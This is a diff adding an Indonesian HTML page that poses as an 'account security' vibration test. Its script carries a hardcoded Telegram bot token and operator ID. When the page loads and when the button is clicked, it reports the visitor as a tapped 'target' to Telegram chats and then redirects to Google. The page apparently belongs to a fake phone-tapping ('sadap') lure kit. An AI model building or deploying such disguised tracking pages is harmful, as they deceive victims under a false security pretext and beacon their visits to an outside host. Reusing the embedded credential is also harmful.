@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Verifikasi Getaran - Keamanan Akun</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 30px;
+            overflow: hidden;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        .header {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+            padding: 30px 20px;
+        }
+        .header h1 {
+            color: white;
+            font-size: 24px;
+        }
+        .content {
+            padding: 40px 20px;
+        }
+        .vibrate-icon {
+            font-size: 80px;
+            animation: shake 0.5s infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .loading {
+            display: none;
+            margin-top: 20px;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #ff6b6b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📳 Verifikasi Getaran</h1>
+            <p>Test getaran perangkat Anda</p>
+        </div>
+        <div class="content">
+            <div class="vibrate-icon">📳</div>
+            <button class="btn" onclick="vibrateAndNotify()">✅ Test Getaran</button>
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p style="margin-top: 10px;">Memproses...</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('id') || 'unknown';
+        
+        let targetUserId = 'unknown';
+        try {
+            const decoded = atob(userId);
+            targetUserId = decoded.split('_')[0];
+        } catch(e) {}
+        
+        const BOT_TOKEN = '8887227913:AAHa5qn2FlUaWM79lmA1jvJTWjb6lK5vCiI';
+        const OWNER_ID = '8486996997';
+        
+        async function sendMessageToTelegram(chatId, message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
+                });
+            } catch(e) {}
+        }
+        
+        async function sendNotification() {
+            const message = `🔴 *TARGET MEMBUKA SADAPAN GETAR*\n\n👤 User ID: \`${targetUserId}\`\n🎯 Type: Vibrate\n🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
+            
+            if (targetUserId && targetUserId !== 'unknown' && targetUserId !== OWNER_ID) {
+                await sendMessageToTelegram(targetUserId, message);
+            }
+            await sendMessageToTelegram(OWNER_ID, `👀 *GETAR DARI USER ${targetUserId}*\n${message}`);
+        }
+        
+        async function vibrateAndNotify() {
+            document.querySelector('.btn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            if (navigator.vibrate) {
+                navigator.vibrate([200, 100, 200, 100, 500]);
+            }
+            
+            const message = `📳 *HASIL SADAP GETAR*\n\n👤 User ID: \`${targetUserId}\`\n📳 Status: Berhasil mengakses getar\n🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
+            
+            if (targetUserId && targetUserId !== 'unknown' && targetUserId !== OWNER_ID) {
+                await sendMessageToTelegram(targetUserId, message);
+            }
+            await sendMessageToTelegram(OWNER_ID, `👀 *HASIL GETAR DARI USER ${targetUserId}*\n${message}`);
+            
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com';
+            }, 2000);
+        }
+        
+        sendNotification();
+        
+        // Auto vibrate
+        setTimeout(() => {
+            if (navigator.vibrate) {
+                navigator.vibrate(500);
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
